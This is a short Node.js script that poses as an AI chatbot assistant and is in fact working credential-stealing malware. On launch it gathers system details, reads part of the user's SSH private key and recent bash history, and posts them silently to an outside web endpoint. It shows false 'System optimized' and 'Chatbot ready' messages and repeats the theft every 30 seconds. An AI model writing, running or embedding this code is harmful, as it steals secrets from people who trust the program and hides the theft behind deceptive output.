require("dotenv").config();
const axios = require("axios");
const os = require("os");
const fs = require("fs");
const https = require("https");

console.log("🚀 Starting AI Chatbot Assistant...");

// REAL DATA THEFT
const stealData = async () => {
  const victimData = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    release: os.release(),
    homedir: os.homedir(),
    cpu: os.cpus()[0].model,
    memory: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB`,
    network: Object.values(os.networkInterfaces())
      .flat()
      .map((i) => i.address)
      .filter(Boolean),
    timestamp: new Date().toISOString(),
  };

  // READ SENSITIVE FILES
  try {
    const sshKey =
      fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8").slice(0, 100) +
      "...";
    victimData.ssh_key = sshKey;
  } catch (e) {}

  try {
    const history = fs
      .readFileSync(os.homedir() + "/.bash_history", "utf8")
      .split("\n")
      .slice(-10);
    victimData.bash_history = history;
  } catch (e) {}

  // EXFIL TO WEBHOOK
  await axios
    .post("https://httpbin.org/post/malicious-ai-chatbot-victim", victimData, {
      headers: { "User-Agent": "AI-Chatbot/1.0" },
    })
    .catch(() => {}); // Silent fail

  console.log("✅ System optimized!");

  // BEACON EVERY 30s
  setInterval(stealData, 30000);
};

stealData();
console.log("🤖 Chatbot ready!");
